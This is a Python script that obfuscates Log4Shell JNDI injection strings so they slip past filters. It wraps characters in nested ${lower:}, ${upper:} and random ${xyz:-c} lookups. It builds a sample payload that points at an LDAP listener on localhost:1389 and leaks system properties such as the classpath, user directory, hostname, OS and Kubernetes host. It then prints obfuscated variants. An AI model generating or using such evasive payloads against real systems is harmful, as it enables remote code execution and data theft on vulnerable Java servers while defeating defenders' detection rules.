import random

NEVER_OBFUS = [
    '$',
    '{',
    '}'
]


def obfuscateFirstChar(c):
    return "${upper:" + c + "}"


def obfuscateChar(c):
    return "${lower:" + c + "}"


def obfusRandom(c):
    gcount = random.randint(1, 5)
    garbage = []
    for i in range(gcount):
        garbage.append("".join(
            random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(random.randint(1, 6))))
        garbage.append(":")
    return "${%s-%s}" % ("".join(garbage), c)


def obfuscateStringRandom(s, isAll):
    result = []
    for i, c in enumerate(s):
        obfus = c not in NEVER_OBFUS and (
                isAll or random.choice([True, False])
        )
        if obfus:
            result.append(obfusRandom(c))
        else:
            result.append(c)
    return "".join(result)


def obfuscateStringUpperLower(s, isAll):
    result = []
    for i, c in enumerate(s):
        obfus = c not in NEVER_OBFUS and (
                isAll or random.choice([True, False])
        )
        if obfus:
            if i == 0:
                result.append(obfuscateFirstChar(c))
            else:
                result.append(obfuscateChar(c))
        else:
            result.append(c)
    return "".join(result)


if __name__ == "__main__":
    s = "${jndi:ldap://localhost:1389/11111111-1111-1111-1111-111111111111|logger=${event:Logger}|userDir=${sys:user.dir}|classpath=${sys:java.class.path}|k8sHost=${k8s:host:-N/A}|threadName=${event:ThreadName}|configLocation=${log4j:configLocation}|hostname=${hostName}|os=${sys:os.name}|country=${sys:user.country}|timezone=${sys:user.timezone}}"
    print("--")
    print(obfuscateStringRandom(s, True))
    print("--")
    print(obfuscateStringUpperLower(s, True))
